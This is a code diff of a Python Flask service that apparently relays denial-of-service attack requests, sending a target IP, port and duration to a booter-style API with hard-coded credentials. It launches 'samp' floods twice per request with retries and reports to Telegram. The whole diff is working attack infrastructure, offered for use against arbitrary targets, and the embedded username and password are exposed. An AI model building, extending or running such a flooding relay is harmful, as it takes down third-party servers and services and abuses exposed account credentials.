@@ -23,15 +23,13 @@ def send_telegram_message(message):
             except:
                 pass
 
-# ==================== TARGET APIS ====================
+# ==================== OLD APIS ONLY ====================
 TARGET_APIS = [
     {"id": 1, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
     {"id": 2, "name": "OLD_API_2", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
-    
-    
-    {"id": 3, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
-    {"id": 5, "name": "OLD_API_1", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
-    
+    {"id": 3, "name": "OLD_API_3", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 4, "name": "OLD_API_4", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
+    {"id": 5, "name": "OLD_API_5", "type": "old", "url": "https://dysphorianetwork.st/api/?username=ytx&password=ytxpass67&method={method}&host={ip}&port={port}&time={time}", "busy": False, "busy_until": 0},
 ]
 
 def is_api_available(api):
@@ -41,7 +39,7 @@ def is_api_available(api):
 
 def mark_busy(api, duration):
     api['busy'] = True
-    api['busy_until'] = time.time() + duration + 10
+    api['busy_until'] = time.time() + (duration * 2) + 15   # 2x duration + buffer
 
 def mark_free(api):
     api['busy'] = False
@@ -74,28 +72,25 @@ def is_attack_successful(response):
         pass
     return response.status_code == 200
 
-def send_attack_to_api(api, ip, port, duration, packet_len=512):
-    method = "samp" if api["type"] == "old" else "udp"
+def send_single_attack(api, ip, port, duration, attack_number):
+    """Send one attack with retry"""
+    method = "samp"
     max_retries = 8
     retry_count = 0
-    success_time = None
 
     while retry_count < max_retries:
         attempt = retry_count + 1
         start_time = time.time()
         
         try:
-            if api["type"] == "old":
-                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
-            else:
-                target_url = api['url'].format(method=method, ip=ip, port=port, time=duration, len=packet_len)
+            target_url = api['url'].format(method=method, ip=ip, port=port, time=duration)
 
             response = requests.get(target_url, timeout=25)
             response_time = int((time.time() - start_time) * 1000)
             
             send_telegram_message(f"""
-🔵 <b>ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
-├ Method: {method.upper()}
+🔵 <b>ATTACK {attack_number}/2 - ATTEMPT #{attempt}/{max_retries}</b> | {api['name']}
+├ Method: SAMP
 ├ Target: {ip}:{port}
 ├ Duration: {duration}s
 ├ Status: {response.status_code}
@@ -104,15 +99,11 @@ def send_attack_to_api(api, ip, port, duration, packet_len=512):
 """)
 
             if is_attack_successful(response):
-                success_time = time.time()
                 send_telegram_message(f"""
-✅ <b>ATTACK STARTED SUCCESSFULLY</b> | {api['name']}
-├ Method: {method.upper()} 
-├ Target: {ip}:{port}
-├ Attempt: {attempt}
-├ Started After: {attempt-1} failed attempts
+✅ <b>ATTACK {attack_number}/2 STARTED</b> | {api['name']}
+├ Target: {ip}:{port} | Duration: {duration}s
 """)
-                return True, success_time
+                return True
 
             retry_count += 1
             if retry_count < max_retries:
@@ -120,97 +111,82 @@ def send_attack_to_api(api, ip, port, duration, packet_len=512):
 
         except Exception as e:
             retry_count += 1
-            send_telegram_message(f"⚠️ Error on {api['name']} (Attempt {attempt}): {str(e)[:150]}")
+            send_telegram_message(f"⚠️ Error on {api['name']} (Attack {attack_number}, Attempt {attempt}): {str(e)[:150]}")
             if retry_count < max_retries:
                 time.sleep(min(2 ** retry_count, 10))
 
-    send_telegram_message(f"💀 All retries failed on {api['name']}")
-    return False, None
+    send_telegram_message(f"💀 Attack {attack_number}/2 failed on {api['name']}")
+    return False
 
-def execute_attack(old_api, new_api, ip, port, total_time, packet_len=512):
-    selected = [old_api, new_api]
+def execute_attack(api, ip, port, total_time):
+    mark_busy(api, total_time)
+    send_telegram_message(f"🚀 STARTING 2x ATTACK on {api['name']} → {ip}:{port} ({total_time}s each)")
+
+    # Send attack 1
+    send_single_attack(api, ip, port, total_time, 1)
     
-    # Mark busy immediately
-    for api in selected:
-        mark_busy(api, total_time)
-        send_telegram_message(f"🚀 LAUNCHING → {api['name']} | {ip}:{port} ({total_time}s)")
-
-    # Run both in parallel
-    threads = []
-    results = []
+    # Small delay between two attacks
+    time.sleep(3)
     
-    for api in selected:
-        t = threading.Thread(target=lambda a=api: results.append(send_attack_to_api(a, ip, port, total_time, packet_len)), daemon=True)
-        threads.append(t)
-        t.start()
+    # Send attack 2
+    send_single_attack(api, ip, port, total_time, 2)
 
-    for t in threads:
-        t.join()
+    # Wait full duration (2x attack)
+    send_telegram_message(f"⏳ Waiting full duration for {api['name']}...")
+    time.sleep(total_time * 2)
 
-    # Wait full requested duration from when attack actually started
-    send_telegram_message(f"⏳ Waiting full attack duration ({total_time}s) for both APIs...")
-    time.sleep(total_time)
-
-    # Release both slots
-    for api in selected:
-        mark_free(api)
-        send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")
-
-    send_telegram_message(f"✅ Pair Attack Cycle Completed → {ip}:{port}")
+    mark_free(api)
+    send_telegram_message(f"✅ SLOT RELEASED → {api['name']} is now available")
 
 @app.route('/attack/start', methods=['GET'])
 def start_attack():
     ip = request.args.get('ip')
     port = request.args.get('port')
     time_param = request.args.get('time')
-    packet_len = request.args.get('len', 512)
+    packet_len = request.args.get('len', 512)  # Not used but kept for compatibility
 
     if not all([ip, port, time_param]):
-        return jsonify({'error': 'Missing parameters'}), 400
+        return jsonify({'error': 'Missing ip, port or time'}), 400
 
     try:
         port = int(port)
         total_time = int(time_param)
-        packet_len = int(packet_len)
-        if total_time <= 0 or total_time > 3600:
+        if total_time <= 0 or total_time > 1800:   # Max 30 minutes
             raise ValueError
     except:
         return jsonify({'error': 'Invalid parameters'}), 400
 
-    # Find available pair
-    for i in range(5):
-        old_api = TARGET_APIS[i]
-        new_api = TARGET_APIS[i + 5]
-        
-        if is_api_available(old_api) and is_api_available(new_api):
-            threading.Thread(
-                target=execute_attack,
-                args=(old_api, new_api, ip, port, total_time, packet_len),
-                daemon=True
-            ).start()
-            
-            return jsonify({
-                'success': True,
-                'pair': f"{old_api['name']} + {new_api['name']}",
-                'target': f'{ip}:{port}',
-                'time': total_time
-            })
+    # Find first available Old API
+    available_api = next((api for api in TARGET_APIS if is_api_available(api)), None)
 
-    return jsonify({'error': 'All API pairs are busy'}), 503
+    if not available_api:
+        return jsonify({'error': 'All Old APIs are busy'}), 503
+
+    threading.Thread(
+        target=execute_attack,
+        args=(available_api, ip, port, total_time),
+        daemon=True
+    ).start()
+
+    return jsonify({
+        'success': True,
+        'api': available_api['name'],
+        'target': f'{ip}:{port}',
+        'attacks': 2,
+        'duration_each': total_time
+    })
 
 @app.route('/status', methods=['GET'])
 def status():
     return jsonify({
-        'free_pairs': [f"Pair {i+1} ({TARGET_APIS[i]['name']}+{TARGET_APIS[i+5]['name']})" 
-                      for i in range(5) if is_api_available(TARGET_APIS[i]) and is_api_available(TARGET_APIS[i+5])],
-        'busy_apis': [api['name'] for api in TARGET_APIS if api['busy']]
+        'free': [api['name'] for api in TARGET_APIS if is_api_available(api)],
+        'busy': [api['name'] for api in TARGET_APIS if api['busy']]
     })
 
 if __name__ == '__main__':
-    print("="*100)
-    print("🚀 IMPROVED PAIRED SYSTEM")
-    print("→ Retries work properly")
-    print("→ Busy timer starts from successful launch")
-    print("→ Both slots released only after full duration")
-    print("="*100)
+    print("="*90)
+    print("🚀 OLD APIS ONLY - 2 ATTACKS PER REQUEST")
+    print("Each attack request = 2x SAMP attack on same API")
+    print("Usage: /attack/start?ip=1.2.3.4&port=80&time=300")
+    print("="*90)
     app.run(host='0.0.0.0', port=8080, threaded=True)
